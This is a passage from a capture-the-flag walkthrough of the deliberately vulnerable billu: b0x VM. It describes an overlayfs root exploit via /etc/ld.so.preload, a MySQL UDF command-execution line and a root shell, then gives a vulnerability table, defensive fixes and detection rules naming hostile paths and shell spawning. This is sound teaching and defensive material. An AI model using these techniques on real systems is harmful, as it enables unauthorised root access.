> write to. The exploit leverages that to obtain a writable `/etc/ld.so.preload` — the
> system-wide list of shared libraries the dynamic linker injects into **every**
> process, including SUID-root ones — and points it at a library whose constructor runs
> `setuid(0); setgid(0); system("/bin/sh")`. The next program executed preloads it as
> root and the shell drops.
>
> **Clean up:** the exploit leaves `/etc/ld.so.preload` and a stray `.so` behind, which
> breaks every subsequent program launch.
> ```bash
> # rm -f /etc/ld.so.preload /tmp/ofs.so
> ```
> Snapshot before you start; revert after.

### 5.4 Alternative path — MySQL UDF injection

We have MySQL root. On this box `mysqld` runs as the `mysql` user, not root, so UDF
injection would give us `mysql` rather than root:

```bash
www-data@indishell:/$ ps aux | grep -i mysql | head -2
mysql     1142  0.0  3.2 327896 33212 ?  Ssl  09:02   0:01 /usr/sbin/mysqld
```

> **Check this before attempting UDF.** If `mysqld` ran as root you could
> `CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so'` and execute
> arbitrary commands as root. Here it does not, so UDF is a lateral move at best.
> **Knowing when a technique does not apply is as important as knowing the technique.**

![Root shell and the flag](images/06-root.png)

### 5.5 Look around as root

```bash
root@indishell:~# ls -la /root
total 32
drwx------  3 root root 4096 Apr  4  2017 .
drwxr-xr-x 22 root root 4096 Apr  4  2017 ..
-rw-r--r--  1 root root 3106 Feb 20  2014 .bashrc
-rw-------  1 root root  220 Apr  4  2017 flag.txt
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
root@indishell:~# cat /root/flag.txt
```

```text
Congratulations! You have rooted billu: b0x.

Thanks for playing.

-- Manish Kishan Tanwar (@indishell1046)
```

*(This machine's flag file varies by image revision; some builds place no flag at all
and treat a root shell as the goal.)*

---

## 6. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | **Arbitrary file read** via unvalidated `file=` POST parameter (`readfile`) | `/test.php` | Full source-code and config disclosure |
| 2 | **Block-list filter on `'` only** | `index.php` login | SQL injection still possible via backslash |
| 3 | **SQL injection — authentication bypass** | `index.php`, `pass` before `uname` | Admin session without credentials |
| 4 | **Filter applied to a copy, original used** (`$choice` filtered, `$_POST['load']` included) | `/panel.php` | **Local File Inclusion → RCE** |
| 5 | **Upload filter checks extension + MIME but not content** | `/add.php` | PHP hidden in a JPEG's EXIF comment |
| 6 | Uploads stored inside the web root with attacker-chosen names | `/uploaded_images/` | Reachable and includable |
| 7 | **MySQL credentials in a web-readable config** | `/var/www/c.php` | Full database disclosure |
| 8 | **phpMyAdmin exposed on the web with `auth_type=config`** | `/var/www/phpmy/config.inc.php` | `root : roottoor` in plaintext |
| 9 | **Credential reuse: DB password = system root password** | `roottoor` | `www-data` → **root** over SSH |
| 10 | Developer test artefact left in production | `/uploaded_images/c.JPG` (contains `phpinfo()`) | Confirms the upload technique |
| 11 | Unpatched kernel 3.13.0-24 (CVE-2015-1328) | Ubuntu 14.04, i686 | Alternative local root |
| 12 | Directory indexing enabled on `/uploaded_images/` and `/phpmy/` | Apache | Content disclosure |
| 13 | `gcc`, `wget`, `curl`, `python` present on the server | `/usr/bin` | Attackers stage and compile locally |
| 14 | Verbose server banner incl. PHP and Suhosin versions | Apache `Server` header | Version-targeted attack planning |

## 7. Defensive lessons (blue team)

1. **Use parameterised queries.** One change removes findings 2 and 3 entirely:
   ```php
   $stmt = $conn->prepare('SELECT * FROM auth WHERE pass = ? AND uname = ?');
   $stmt->bind_param('ss', $pass, $un);
   $stmt->execute();
   ```
   With placeholders, `\` and `--` are *data*, never syntax. Block-lists like
   `str_replace("'", "", ...)` are unwinnable — they must anticipate every way a
   parser can be confused, and they never do.
2. **Filter the value you actually use.** The `panel.php` bug is
   `str_replace` on `$choice`, then `include($_POST['load'])`. Validate the exact
   variable that reaches the sink, and validate with an **allow-list**:
   ```php
   $allowed = ['add' => 'add.php', 'show' => 'show.php'];
   $page = $allowed[$_POST['load'] ?? ''] ?? null;
   if (!$page) { http_response_code(400); exit; }
   include __DIR__ . '/' . $page;
   ```
3. **Never pass user input to `include`/`require` at all.** If you must, use
   `basename()` to strip directory components and an explicit allow-list of names.
4. **Validate uploads by re-encoding, not by sniffing.** `finfo` tells you the file
   *starts* like a JPEG; it does not tell you the file contains *only* a JPEG. The
   robust fix:
   ```php
   $img = imagecreatefromjpeg($_FILES['image']['tmp_name']);   // fails if not a real JPEG
   imagejpeg($img, $dest . '/' . $newname, 85);                // re-encode: all metadata destroyed
   imagedestroy($img);
   ```
   Then: store uploads **outside** the document root, give them a **random UUID name**,
   serve them from a **separate non-executing host/handler**, and disable the PHP engine
   in the upload directory:
   ```apache
   <Directory /var/www/uploaded_images>
       php_flag engine off
       RemoveHandler .php .phtml .php3 .php4 .php5 .phar
       <FilesMatch "\.ph(p[3457]?|t|tml)$"> Require all denied </FilesMatch>
   </Directory>
   ```
5. **Remove phpMyAdmin from production.** It is an attack surface with a decade of
   CVEs, and `auth_type = 'config'` hard-codes credentials into a web-readable file.
   If you genuinely need it: bind to `127.0.0.1` and reach it via SSH tunnel, put it
   behind a VPN or mutual TLS, restrict by IP, and use `auth_type = 'cookie'`.
6. **Secrets out of source files.** `c.php` and `config.inc.php` both leaked
   credentials. Use environment variables (`SetEnv` in Apache, `EnvironmentFile=` in
   systemd) or a vault, and lock the files down:
   ```bash
   chmod 640 config.inc.php && chown root:www-data config.inc.php
   ```
   Scan your codebase with `gitleaks` / `trufflehog` / `detect-secrets` in CI.
7. **No credential reuse.** A MySQL root password must never equal the system root
   password. Enforce uniqueness and screen against breached lists.
8. **Do not ship test artefacts.** `c.JPG` containing `phpinfo()` should never reach
   production. Add a pre-deploy step that diffs the web root against the build
   artefact.
9. **Turn off directory indexing:** `Options -Indexes`. And strip banners:
   ```apache
   ServerTokens Prod
   ServerSignature Off
   ```
   ```ini
   ; php.ini
   expose_php = Off
   ```
10. **Remove build tools from servers.** `gcc` on a web server converted "foothold"
    into "root in 60 seconds" via the kernel path. Build in CI, ship an artefact.
11. **Detection opportunities.**
    - WAF/alert on POST bodies containing `../`, `/etc/passwd`, `php://`, or
      `file=` parameters naming system paths.
    - Alert on `include` of any path under `uploaded_images/` — that is *always* an
      exploit attempt here.
    - Alert on file creation in an upload directory whose bytes contain `<?php`
      (a 10-line `inotifywait` + `grep` watcher, or FIM).
    - Process-lineage monitoring: `apache2` spawning `sh`, `bash`, `python`, `wget`
      or `gcc` is an immediate critical alert.
    - Alert on `/etc/ld.so.preload` being created (the overlayfs exploit's signature):
      `auditctl -w /etc/ld.so.preload -p wa -k ldpreload`.
    - Alert on `su`/`ssh` to root from a session whose parent is the web server.

---

## 8. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: <https://vulnhub.com/entry/billu-b0x,188/>
- Series: <https://vulnhub.com/series/billu,117/> · sequel [`labs/8-123-billu-b0x-2/`](../8-123-billu-b0x-2/README.md)
- Author: Manish Kishan Tanwar — `@indishell1046`
- Community writeups consulted:
  - [scriptkidd1e — billu: b0x Vulnhub's VM Walkthrough](https://scriptkidd1e.wordpress.com/billu-b0x-vulnhubs-vm-walkthrough/)
  - [Ross Marks — Vulnhub: Billu – b0x](https://rossmarks.uk/blog/vulnhub-billu-b0x/)
  - [The Hacking Blog — Billu B0x](https://thehackingblog.com/2018-09-24/billu-b0x-writeup/)
  - [HackPlayers — [VulnHub write-up] billu: b0x](https://www.hackplayers.com/2017/04/vulnhub-write-up-billu-b0x.html)
  - [InfoSec Institute — Billu: B0x Walkthrough](https://resources.infosecinstitute.com/topic/billu-b0x-walkthrough/)
  - [YeahHub — CTF Billu B0x Walkthrough](https://www.yeahhub.com/ctf-billu-b0x-walkthrough/)
  - [securitybytes — Billu: b0x VM Walkthrough](https://medium.com/securitybytes/billu-b0x-vm-51c7720434b7)
  - [chirec — VulnHub Billu b0x Walkthrough](https://chirec.github.io/2019-05-16/VulnHub-Billu-b0x/)
  - [pwnedu — billu-b0x Hacking Challenge Walk Through](https://steemit.com/hacking/@pwnedu/billu-b0x-hacking-challenge-walk-through)
- Background reading:
  - [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) · [CWE-89](https://cwe.mitre.org/data/definitions/89.html)
  - [OWASP — Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
  - [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
  - [MySQL reference — string literals and the backslash escape](https://dev.mysql.com/doc/refman/8.0/en/string-literals.html)
  - [MySQL reference — comment syntax (`-- ` requires a space)](https://dev.mysql.com/doc/refman/8.0/en/comments.html)
  - PHP [`include`](https://www.php.net/manual/en/function.include.php) vs [`readfile`](https://www.php.net/manual/en/function.readfile.php) vs [`finfo`](https://www.php.net/manual/en/class.finfo.php)
  - [JPEG file format — COM and APPn segments](https://www.w3.org/Graphics/JPEG/itu-t81.pdf) · [`exiftool`](https://exiftool.org/)
  - [CVE-2015-1328 — Ubuntu overlayfs LPE](https://nvd.nist.gov/vuln/detail/CVE-2015-1328) · [Exploit-DB 37292](https://www.exploit-db.com/exploits/37292)
  - [GTFOBins](https://gtfobins.github.io) · [pentestmonkey — PHP reverse shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)

---

## 9. Screenshot checklist

- [ ] `images/01-nmap.png` — ports 22 and 80 with the Apache/PHP banner
- [ ] `images/02-lfi.png` — `test.php` returning `/etc/passwd`
- [ ] `images/03-source.png` — `index.php` and `panel.php` source through the LFI
- [ ] `images/04-panel.png` — the `302 → panel.php` after the SQLi bypass
- [ ] `images/05-shell.png` — reverse shell as `www-data`
- [ ] `images/06-root.png` — `config.inc.php` credentials and the root shell

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md) · [progress](../../docs/PROGRESS.md)._
